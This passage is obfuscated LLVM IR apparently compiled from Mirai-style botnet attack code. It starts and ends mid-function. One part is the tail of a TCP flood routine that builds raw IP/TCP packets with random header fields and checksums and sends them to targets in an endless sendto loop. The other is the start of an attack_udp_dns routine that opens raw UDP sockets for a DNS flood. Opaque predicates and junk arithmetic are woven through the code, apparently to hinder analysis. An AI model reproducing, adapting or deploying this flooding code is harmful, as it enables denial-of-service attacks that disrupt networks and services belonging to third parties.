  %319 = load i32, i32* @y.36
  %320 = sub i32 %318, 1
  %321 = mul i32 %318, %320
  %322 = urem i32 %321, 2
  %323 = icmp eq i32 %322, 0
  %324 = icmp slt i32 %319, 10
  %325 = or i1 %323, %324
  br i1 %325, label %originalBB45, label %originalBB45alteredBB

originalBB45:                                     ; preds = %originalBB45alteredBB, %317
  %326 = load i32, i32* @x.35
  %327 = load i32, i32* @y.36
  %328 = sub i32 %326, 1
  %329 = mul i32 %326, %328
  %330 = urem i32 %329, 2
  %331 = icmp eq i32 %330, 0
  %332 = icmp slt i32 %327, 10
  %333 = or i1 %331, %332
  br i1 %333, label %originalBBpart247, label %originalBB45alteredBB

originalBBpart247:                                ; preds = %originalBB45
  br label %334

; <label>:334:                                    ; preds = %556, %originalBBpart247
  store i32 0, i32* %9, align 4
  br label %335

; <label>:335:                                    ; preds = %553, %334
  %336 = load i32, i32* %9, align 4
  %337 = load i8, i8* %5, align 1
  %338 = zext i8 %337 to i32
  %339 = icmp slt i32 %336, %338
  br i1 %339, label %340, label %556

; <label>:340:                                    ; preds = %335
  %341 = load i8**, i8*** %11, align 8
  %342 = load i32, i32* %9, align 4
  %343 = sext i32 %342 to i64
  %344 = getelementptr inbounds i8*, i8** %341, i64 %343
  %345 = load i8*, i8** %344, align 8
  store i8* %345, i8** %32, align 8
  %346 = load i8*, i8** %32, align 8
  %347 = bitcast i8* %346 to %struct.iphdr*
  store %struct.iphdr* %347, %struct.iphdr** %33, align 8
  %348 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %349 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %348, i64 1
  %350 = bitcast %struct.iphdr* %349 to %struct.tcphdr*
  store %struct.tcphdr* %350, %struct.tcphdr** %34, align 8
  %351 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %352 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %351, i64 1
  %353 = bitcast %struct.tcphdr* %352 to i8*
  store i8* %353, i8** %35, align 8
  %354 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %355 = load i32, i32* %9, align 4
  %356 = sext i32 %355 to i64
  %357 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %354, i64 %356
  %358 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %357, i32 0, i32 2
  %359 = load i8, i8* %358, align 4
  %360 = zext i8 %359 to i32
  %361 = icmp slt i32 %360, 32
  br i1 %361, label %362, label %383

; <label>:362:                                    ; preds = %340
  %363 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %364 = load i32, i32* %9, align 4
  %365 = sext i32 %364 to i64
  %366 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %363, i64 %365
  %367 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %366, i32 0, i32 1
  %368 = load i32, i32* %367, align 4
  %369 = call i32 @ntohl(i32 %368) #7
  %370 = call i32 @rand_next()
  %371 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %372 = load i32, i32* %9, align 4
  %373 = sext i32 %372 to i64
  %374 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %371, i64 %373
  %375 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %374, i32 0, i32 2
  %376 = load i8, i8* %375, align 4
  %377 = zext i8 %376 to i32
  %378 = lshr i32 %370, %377
  %379 = add i32 %369, %378
  %380 = call i32 @htonl(i32 %379) #7
  %381 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %382 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %381, i32 0, i32 9
  store i32 %380, i32* %382, align 4
  br label %383

; <label>:383:                                    ; preds = %362, %340
  %384 = load i32, i32* @x.35
  %385 = load i32, i32* @y.36
  %386 = sub i32 %384, 1
  %387 = mul i32 %384, %386
  %388 = urem i32 %387, 2
  %389 = icmp eq i32 %388, 0
  %390 = icmp slt i32 %385, 10
  %391 = or i1 %389, %390
  br i1 %391, label %originalBB49, label %originalBB49alteredBB

originalBB49:                                     ; preds = %originalBB49alteredBB, %383
  %392 = load i32, i32* %28, align 4
  %393 = icmp eq i32 %392, -1
  %394 = load i32, i32* @x.35
  %395 = load i32, i32* @y.36
  %396 = sub i32 %394, 1
  %397 = mul i32 %394, %396
  %398 = urem i32 %397, 2
  %399 = icmp eq i32 %398, 0
  %400 = icmp slt i32 %395, 10
  %401 = or i1 %399, %400
  br i1 %401, label %originalBBpart251, label %originalBB49alteredBB

originalBBpart251:                                ; preds = %originalBB49
  br i1 %393, label %402, label %406

; <label>:402:                                    ; preds = %originalBBpart251
  %403 = call i32 @rand_next()
  %404 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %405 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %404, i32 0, i32 8
  store i32 %403, i32* %405, align 4
  br label %406

; <label>:406:                                    ; preds = %402, %originalBBpart251
  %407 = load i32, i32* @x.35
  %408 = load i32, i32* @y.36
  %409 = sub i32 %407, 1
  %410 = mul i32 %407, %409
  %411 = urem i32 %410, 2
  %412 = icmp eq i32 %411, 0
  %413 = icmp slt i32 %408, 10
  %414 = or i1 %412, %413
  br i1 %414, label %originalBB53, label %originalBB53alteredBB

originalBB53:                                     ; preds = %originalBB53alteredBB, %406
  %415 = load i16, i16* %13, align 2
  %416 = zext i16 %415 to i32
  %417 = icmp eq i32 %416, 65535
  %418 = load i32, i32* @x.35
  %419 = load i32, i32* @y.36
  %420 = sub i32 %418, 1
  %421 = mul i32 %418, %420
  %422 = urem i32 %421, 2
  %423 = icmp eq i32 %422, 0
  %424 = icmp slt i32 %419, 10
  %425 = or i1 %423, %424
  br i1 %425, label %originalBBpart255, label %originalBB53alteredBB

originalBBpart255:                                ; preds = %originalBB53
  br i1 %417, label %426, label %432

; <label>:426:                                    ; preds = %originalBBpart255
  %427 = call i32 @rand_next()
  %428 = and i32 %427, 65535
  %429 = trunc i32 %428 to i16
  %430 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %431 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %430, i32 0, i32 3
  store i16 %429, i16* %431, align 4
  br label %432

; <label>:432:                                    ; preds = %426, %originalBBpart255
  %433 = load i16, i16* %16, align 2
  %434 = zext i16 %433 to i32
  %435 = icmp eq i32 %434, 65535
  br i1 %435, label %436, label %442

; <label>:436:                                    ; preds = %432
  %437 = call i32 @rand_next()
  %438 = and i32 %437, 65535
  %439 = trunc i32 %438 to i16
  %440 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %441 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %440, i32 0, i32 0
  store i16 %439, i16* %441, align 4
  br label %442

; <label>:442:                                    ; preds = %436, %432
  %443 = load i16, i16* %17, align 2
  %444 = zext i16 %443 to i32
  %445 = icmp eq i32 %444, 65535
  br i1 %445, label %446, label %468

; <label>:446:                                    ; preds = %442
  %447 = load i32, i32* @x.35
  %448 = load i32, i32* @y.36
  %449 = sub i32 %447, 1
  %450 = mul i32 %447, %449
  %451 = urem i32 %450, 2
  %452 = icmp eq i32 %451, 0
  %453 = icmp slt i32 %448, 10
  %454 = or i1 %452, %453
  br i1 %454, label %originalBB57, label %originalBB57alteredBB

originalBB57:                                     ; preds = %originalBB57alteredBB, %446
  %455 = call i32 @rand_next()
  %456 = and i32 %455, 65535
  %457 = trunc i32 %456 to i16
  %458 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %459 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %458, i32 0, i32 1
  store i16 %457, i16* %459, align 2
  %460 = load i32, i32* @x.35
  %461 = load i32, i32* @y.36
  %462 = sub i32 %460, 1
  %463 = mul i32 %460, %462
  %464 = urem i32 %463, 2
  %465 = icmp eq i32 %464, 0
  %466 = icmp slt i32 %461, 10
  %467 = or i1 %465, %466
  br i1 %467, label %originalBBpart270, label %originalBB57alteredBB

originalBBpart270:                                ; preds = %originalBB57
  br label %468

; <label>:468:                                    ; preds = %originalBBpart270, %442
  %469 = load i32, i32* @x.35
  %470 = load i32, i32* @y.36
  %471 = sub i32 %469, 1
  %472 = mul i32 %469, %471
  %473 = urem i32 %472, 2
  %474 = icmp eq i32 %473, 0
  %475 = icmp slt i32 %470, 10
  %476 = or i1 %474, %475
  br i1 %476, label %originalBB72, label %originalBB72alteredBB

originalBB72:                                     ; preds = %originalBB72alteredBB, %468
  %477 = load i32, i32* %18, align 4
  %478 = icmp eq i32 %477, 65535
  %479 = load i32, i32* @x.35
  %480 = load i32, i32* @y.36
  %481 = sub i32 %479, 1
  %482 = mul i32 %479, %481
  %483 = urem i32 %482, 2
  %484 = icmp eq i32 %483, 0
  %485 = icmp slt i32 %480, 10
  %486 = or i1 %484, %485
  br i1 %486, label %originalBBpart274, label %originalBB72alteredBB

originalBBpart274:                                ; preds = %originalBB72
  br i1 %478, label %487, label %491

; <label>:487:                                    ; preds = %originalBBpart274
  %488 = call i32 @rand_next()
  %489 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %490 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %489, i32 0, i32 2
  store i32 %488, i32* %490, align 4
  br label %491

; <label>:491:                                    ; preds = %487, %originalBBpart274
  %492 = load i32, i32* %19, align 4
  %493 = icmp eq i32 %492, 65535
  br i1 %493, label %494, label %498

; <label>:494:                                    ; preds = %491
  %495 = call i32 @rand_next()
  %496 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %497 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %496, i32 0, i32 3
  store i32 %495, i32* %497, align 4
  br label %498

; <label>:498:                                    ; preds = %494, %491
  %499 = load i8, i8* %27, align 1
  %500 = icmp ne i8 %499, 0
  br i1 %500, label %501, label %504

; <label>:501:                                    ; preds = %498
  %502 = load i8*, i8** %35, align 8
  %503 = load i32, i32* %26, align 4
  call void @rand_str(i8* %502, i32 %503)
  br label %504

; <label>:504:                                    ; preds = %501, %498
  %505 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %506 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %505, i32 0, i32 7
  store i16 0, i16* %506, align 2
  %507 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %508 = bitcast %struct.iphdr* %507 to i16*
  %509 = call zeroext i16 @checksum_generic(i16* %508, i32 20)
  %510 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %511 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %510, i32 0, i32 7
  store i16 %509, i16* %511, align 2
  %512 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %513 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %512, i32 0, i32 6
  store i16 0, i16* %513, align 4
  %514 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %515 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %516 = bitcast %struct.tcphdr* %515 to i8*
  %517 = load i32, i32* %26, align 4
  %518 = sext i32 %517 to i64
  %519 = add i64 20, %518
  %520 = trunc i64 %519 to i16
  %521 = call zeroext i16 @htons(i16 zeroext %520) #7
  %522 = load i32, i32* %26, align 4
  %523 = sext i32 %522 to i64
  %524 = add i64 20, %523
  %525 = trunc i64 %524 to i32
  %526 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %514, i8* %516, i16 zeroext %521, i32 %525)
  %527 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %528 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %527, i32 0, i32 6
  store i16 %526, i16* %528, align 4
  %529 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %530 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %529, i32 0, i32 1
  %531 = load i16, i16* %530, align 2
  %532 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %533 = load i32, i32* %9, align 4
  %534 = sext i32 %533 to i64
  %535 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %532, i64 %534
  %536 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %535, i32 0, i32 0
  %537 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %536, i32 0, i32 1
  store i16 %531, i16* %537, align 2
  %538 = load i32, i32* %10, align 4
  %539 = load i8*, i8** %32, align 8
  %540 = load i32, i32* %26, align 4
  %541 = sext i32 %540 to i64
  %542 = add i64 40, %541
  %543 = bitcast %union.__CONST_SOCKADDR_ARG* %36 to %struct.sockaddr**
  %544 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %545 = load i32, i32* %9, align 4
  %546 = sext i32 %545 to i64
  %547 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %544, i64 %546
  %548 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %547, i32 0, i32 0
  %549 = bitcast %struct.sockaddr_in* %548 to %struct.sockaddr*
  store %struct.sockaddr* %549, %struct.sockaddr** %543, align 8
  %550 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %36, i32 0, i32 0
  %551 = load %struct.sockaddr*, %struct.sockaddr** %550, align 8
  %552 = call i64 @sendto(i32 %538, i8* %539, i64 %542, i32 16384, %struct.sockaddr* %551, i32 16)
  br label %553

; <label>:553:                                    ; preds = %504
  %554 = load i32, i32* %9, align 4
  %555 = add nsw i32 %554, 1
  store i32 %555, i32* %9, align 4
  br label %335

; <label>:556:                                    ; preds = %335
  br label %334

; <label>:557:                                    ; preds = %114, %108
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %123
  store i8* getelementptr inbounds ([125 x i8], [125 x i8]* @.str.257, i32 0, i32 0), i8** %31, align 8
  %558 = call noalias i8* @calloc(i64 1458, i64 1) #6
  %559 = load i8**, i8*** %11, align 8
  %560 = load i32, i32* %9, align 4
  %561 = sext i32 %560 to i64
  %562 = getelementptr inbounds i8*, i8** %559, i64 %561
  store i8* %558, i8** %562, align 8
  %563 = load i8**, i8*** %11, align 8
  %564 = load i32, i32* %9, align 4
  %565 = sext i32 %564 to i64
  %566 = getelementptr inbounds i8*, i8** %563, i64 %565
  %567 = load i8*, i8** %566, align 8
  %568 = bitcast i8* %567 to %struct.iphdr*
  store %struct.iphdr* %568, %struct.iphdr** %29, align 8
  %569 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %570 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %569, i64 1
  %571 = bitcast %struct.iphdr* %570 to %struct.tcphdr*
  store %struct.tcphdr* %571, %struct.tcphdr** %30, align 8
  %572 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %573 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %572, i64 124
  %574 = bitcast %struct.tcphdr* %573 to i8*
  store i8* %574, i8** %31, align 8
  %575 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %576 = bitcast %struct.iphdr* %575 to i8*
  %577 = load i8, i8* %576, align 4
  %_ = sub i8 %577, 15
  %gen = mul i8 %_, 15
  %_1 = shl i8 %577, 15
  %_2 = sub i8 %577, 15
  %gen3 = mul i8 %_2, 15
  %_4 = sub i8 %577, 15
  %gen5 = mul i8 %_4, 15
  %_6 = sub i8 0, %577
  %gen7 = add i8 %_6, 15
  %578 = and i8 %577, 15
  %_8 = shl i8 %578, 64
  %_9 = sub i8 %578, 64
  %gen10 = mul i8 %_9, 64
  %579 = or i8 %578, 64
  store i8 %579, i8* %576, align 4
  %580 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %581 = bitcast %struct.iphdr* %580 to i8*
  %582 = load i8, i8* %581, align 4
  %_11 = sub i8 0, %582
  %gen12 = add i8 %_11, -16
  %_13 = sub i8 %582, -16
  %gen14 = mul i8 %_13, -16
  %_15 = shl i8 %582, -16
  %_16 = sub i8 %582, -16
  %gen17 = mul i8 %_16, -16
  %_18 = sub i8 %582, -16
  %gen19 = mul i8 %_18, -16
  %583 = and i8 %582, -16
  %_20 = sub i8 0, %583
  %gen21 = add i8 %_20, 5
  %_22 = sub i8 %583, 5
  %gen23 = mul i8 %_22, 5
  %584 = or i8 %583, 5
  store i8 %584, i8* %581, align 4
  %585 = load i8, i8* %12, align 1
  %586 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %587 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %586, i32 0, i32 1
  store i8 %585, i8* %587, align 1
  %588 = load i32, i32* %26, align 4
  %589 = sext i32 %588 to i64
  %_24 = sub i64 40, %589
  %gen25 = mul i64 %_24, %589
  %_26 = sub i64 0, 40
  %gen27 = add i64 %_26, %589
  %_28 = sub i64 40, %589
  %gen29 = mul i64 %_28, %589
  %_30 = sub i64 0, 40
  %gen31 = add i64 %_30, %589
  %_32 = sub i64 0, 40
  %gen33 = add i64 %_32, %589
  %590 = add i64 40, %589
  %591 = trunc i64 %590 to i16
  %592 = call zeroext i16 @htons(i16 zeroext %591) #7
  %593 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %594 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %593, i32 0, i32 2
  store i16 %592, i16* %594, align 2
  %595 = load i16, i16* %13, align 2
  %596 = call zeroext i16 @htons(i16 zeroext %595) #7
  %597 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %598 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %597, i32 0, i32 3
  store i16 %596, i16* %598, align 4
  %599 = load i8, i8* %14, align 1
  %600 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %601 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %600, i32 0, i32 5
  store i8 %599, i8* %601, align 4
  %602 = load i8, i8* %15, align 1
  %603 = icmp ne i8 %602, 0
  br label %originalBB

originalBB34alteredBB:                            ; preds = %originalBB34, %186
  %604 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %605 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %606 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %605, i32 0, i32 4
  store i16 %604, i16* %606, align 2
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %298
  %607 = load i32, i32* %9, align 4
  %_39 = shl i32 %607, 1
  %_40 = shl i32 %607, 1
  %_41 = shl i32 %607, 1
  %608 = add nsw i32 %607, 1
  store i32 %608, i32* %9, align 4
  br label %originalBB38

originalBB45alteredBB:                            ; preds = %originalBB45, %317
  br label %originalBB45

originalBB49alteredBB:                            ; preds = %originalBB49, %383
  %609 = load i32, i32* %28, align 4
  %610 = icmp eq i32 %609, -1
  br label %originalBB49

originalBB53alteredBB:                            ; preds = %originalBB53, %406
  %611 = load i16, i16* %13, align 2
  %612 = zext i16 %611 to i32
  %613 = icmp eq i32 %612, 65535
  br label %originalBB53

originalBB57alteredBB:                            ; preds = %originalBB57, %446
  %614 = call i32 @rand_next()
  %_58 = shl i32 %614, 65535
  %_59 = sub i32 %614, 65535
  %gen60 = mul i32 %_59, 65535
  %_61 = sub i32 0, %614
  %gen62 = add i32 %_61, 65535
  %_63 = sub i32 0, %614
  %gen64 = add i32 %_63, 65535
  %_65 = sub i32 %614, 65535
  %gen66 = mul i32 %_65, 65535
  %_67 = shl i32 %614, 65535
  %_68 = shl i32 %614, 65535
  %615 = and i32 %614, 65535
  %616 = trunc i32 %615 to i16
  %617 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %618 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %617, i32 0, i32 1
  store i16 %616, i16* %618, align 2
  br label %originalBB57

originalBB72alteredBB:                            ; preds = %originalBB72, %468
  %619 = load i32, i32* %18, align 4
  %620 = icmp eq i32 %619, 65535
  br label %originalBB72
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_dns(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = load i32, i32* @x.37
  %6 = load i32, i32* @y.38
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i8, align 1
  %14 = alloca %struct.attack_target*, align 8
  %15 = alloca i8, align 1
  %16 = alloca %struct.attack_option*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8**, align 8
  %20 = alloca i8, align 1
  %21 = alloca i16, align 2
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i16, align 2
  %25 = alloca i16, align 2
  %26 = alloca i16, align 2
  %27 = alloca i8, align 1
  %28 = alloca i8*, align 8
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i8, align 1
  %33 = alloca i8, align 1
  %34 = alloca %struct.iphdr*, align 8
  %35 = alloca %struct.udphdr*, align 8
  %36 = alloca %struct.dnshdr*, align 8
  %37 = alloca i8*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca %struct.grehdr*, align 8
  %40 = alloca [256 x i8*], align 16
  %41 = alloca i8*, align 8
  %42 = alloca %struct.iphdr*, align 8
  %43 = alloca %struct.udphdr*, align 8
  %44 = alloca %struct.dnshdr*, align 8
  %45 = alloca i8*, align 8
  %46 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %13, align 1
  store %struct.attack_target* %1, %struct.attack_target** %14, align 8
  store i8 %2, i8* %15, align 1
  store %struct.attack_option* %3, %struct.attack_option** %16, align 8
  %47 = load i8, i8* %13, align 1
  %48 = zext i8 %47 to i64
  %49 = call noalias i8* @calloc(i64 %48, i64 8) #6
  %50 = bitcast i8* %49 to i8**
  store i8** %50, i8*** %19, align 8
  %51 = load i8, i8* %15, align 1
  %52 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %53 = call i32 @attack_get_opt_int(i8 zeroext %51, %struct.attack_option* %52, i8 zeroext 2, i32 0)
  %54 = trunc i32 %53 to i8
  store i8 %54, i8* %20, align 1
  %55 = load i8, i8* %15, align 1
  %56 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %57 = call i32 @attack_get_opt_int(i8 zeroext %55, %struct.attack_option* %56, i8 zeroext 3, i32 65535)
  %58 = trunc i32 %57 to i16
  store i16 %58, i16* %21, align 2
  %59 = load i8, i8* %15, align 1
  %60 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %61 = call i32 @attack_get_opt_int(i8 zeroext %59, %struct.attack_option* %60, i8 zeroext 4, i32 64)
  %62 = trunc i32 %61 to i8
  store i8 %62, i8* %22, align 1
  %63 = load i8, i8* %15, align 1
  %64 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %65 = call i32 @attack_get_opt_int(i8 zeroext %63, %struct.attack_option* %64, i8 zeroext 5, i32 0)
  %66 = trunc i32 %65 to i8
  store i8 %66, i8* %23, align 1
  %67 = load i8, i8* %15, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %69 = call i32 @attack_get_opt_int(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 6, i32 65535)
  %70 = trunc i32 %69 to i16
  store i16 %70, i16* %24, align 2
  %71 = load i8, i8* %15, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 7, i32 53)
  %74 = trunc i32 %73 to i16
  store i16 %74, i16* %25, align 2
  %75 = load i8, i8* %15, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 9, i32 65535)
  %78 = trunc i32 %77 to i16
  store i16 %78, i16* %26, align 2
  %79 = load i8, i8* %15, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 0, i32 1458)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %27, align 1
  %83 = load i8, i8* %15, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %85 = call i8* @attack_get_opt_str(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 8, i8* null)
  store i8* %85, i8** %28, align 8
  %86 = call i32 @get_dns_resolver()
  store i32 %86, i32* %30, align 4
  %87 = load i8*, i8** %28, align 8
  %88 = icmp eq i8* %87, null
  %89 = load i32, i32* @x.37
  %90 = load i32, i32* @y.38
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %88, label %97, label %114

; <label>:97:                                     ; preds = %originalBBpart2
  %98 = load i32, i32* @x.37
  %99 = load i32, i32* @y.38
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %97
  %106 = load i32, i32* @x.37
  %107 = load i32, i32* @y.38
  %108 = sub i32 %106, 1
  %109 = mul i32 %106, %108
  %110 = urem i32 %109, 2
  %111 = icmp eq i32 %110, 0
  %112 = icmp slt i32 %107, 10
  %113 = or i1 %111, %112
  br i1 %113, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %575

; <label>:114:                                    ; preds = %originalBBpart2
  %115 = load i8*, i8** %28, align 8
  %116 = call i32 @util_strlen(i8* %115)
  store i32 %116, i32* %29, align 4
  %117 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %117, i32* %18, align 4
  %118 = icmp eq i32 %117, -1
  br i1 %118, label %119, label %120

; <label>:119:                                    ; preds = %114
  br label %575

; <label>:120:                                    ; preds = %114
  store i32 1, i32* %17, align 4
  %121 = load i32, i32* %18, align 4
  %122 = bitcast i32* %17 to i8*
  %123 = call i32 @setsockopt(i32 %121, i32 0, i32 3, i8* %122, i32 4) #6
  %124 = icmp eq i32 %123, -1
  br i1 %124, label %125, label %128

; <label>:125:                                    ; preds = %120
  %126 = load i32, i32* %18, align 4
  %127 = call i32 @close(i32 %126)
  br label %575

; <label>:128:                                    ; preds = %120
  store i32 0, i32* %17, align 4
  br label %129

; <label>:129:                                    ; preds = %354, %128
  %130 = load i32, i32* @x.37
  %131 = load i32, i32* @y.38
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %129
  %138 = load i32, i32* %17, align 4
  %139 = load i8, i8* %13, align 1
  %140 = zext i8 %139 to i32
  %141 = icmp slt i32 %138, %140
  %142 = load i32, i32* @x.37
  %143 = load i32, i32* @y.38
  %144 = sub i32 %142, 1
  %145 = mul i32 %142, %144
  %146 = urem i32 %145, 2
  %147 = icmp eq i32 %146, 0
  %148 = icmp slt i32 %143, 10
  %149 = or i1 %147, %148
  br i1 %149, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %141, label %150, label %357

; <label>:150:                                    ; preds = %originalBBpart28
  store i8 0, i8* %32, align 1
  store i8 0, i8* %33, align 1
  %151 = call noalias i8* @calloc(i64 1458, i64 1) #6
  %152 = load i8**, i8*** %19, align 8
  %153 = load i32, i32* %17, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds i8*, i8** %152, i64 %154
  store i8* %151, i8** %155, align 8
  %156 = load i8**, i8*** %19, align 8
  %157 = load i32, i32* %17, align 4
  %158 = sext i32 %157 to i64
  %159 = getelementptr inbounds i8*, i8** %156, i64 %158
  %160 = load i8*, i8** %159, align 8
  %161 = bitcast i8* %160 to %struct.iphdr*
  store %struct.iphdr* %161, %struct.iphdr** %34, align 8
  %162 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %163 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %162, i64 1
  %164 = bitcast %struct.iphdr* %163 to %struct.udphdr*
  store %struct.udphdr* %164, %struct.udphdr** %35, align 8
  %165 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %166 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %165, i64 1
  %167 = bitcast %struct.udphdr* %166 to %struct.dnshdr*
  store %struct.dnshdr* %167, %struct.dnshdr** %36, align 8
  %168 = load %struct.dnshdr*, %struct.dnshdr** %36, align 8
  %169 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %168, i64 1
  %170 = bitcast %struct.dnshdr* %169 to i8*
  store i8* %170, i8** %37, align 8
  %171 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %172 = bitcast %struct.iphdr* %171 to i8*
  %173 = load i8, i8* %172, align 4
  %174 = and i8 %173, 15
  %175 = or i8 %174, 64
  store i8 %175, i8* %172, align 4
  %176 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %177 = bitcast %struct.iphdr* %176 to i8*
  %178 = load i8, i8* %177, align 4
  %179 = and i8 %178, -16
  %180 = or i8 %179, 5
  store i8 %180, i8* %177, align 4
  %181 = load i8, i8* %20, align 1
  %182 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %183 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %182, i32 0, i32 1
  store i8 %181, i8* %183, align 1
  %184 = load i8, i8* %27, align 1
  %185 = zext i8 %184 to i64
